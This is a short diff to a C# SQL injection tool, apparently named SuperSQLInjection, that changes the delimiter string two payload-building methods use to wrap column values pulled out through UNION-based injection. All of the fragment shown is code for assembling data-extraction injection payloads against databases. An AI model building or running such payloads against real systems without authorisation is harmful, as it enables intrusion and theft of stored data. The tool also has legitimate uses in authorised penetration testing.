@@ -91,7 +91,7 @@ namespace SuperSQLInjection.payload
         public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String dbname, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = "chr(94)||chr(94)||chr(33)||" + Comm.unionColumns(columns, "||chr(36)||chr(36)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
+            String data = "chr(94)||chr(94)||chr(33)||" + Comm.unionColumns(columns, "||chr(36)||chr(9)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
             for (int i = 1; i <= columnsLen; i++)
             {
                 if (i == showIndex)
@@ -163,7 +163,7 @@ namespace SuperSQLInjection.payload
         public static String getDataValue(List<String> columns, String dbName, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = Comm.unionColumns(columns, "||chr(36)||chr(36)||chr(36)||");
+            String data = Comm.unionColumns(columns, "||chr(36)||chr(9)||chr(36)||");
             sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index));
             sb.Append(",");
             sb.Remove(sb.Length - 1, 1);
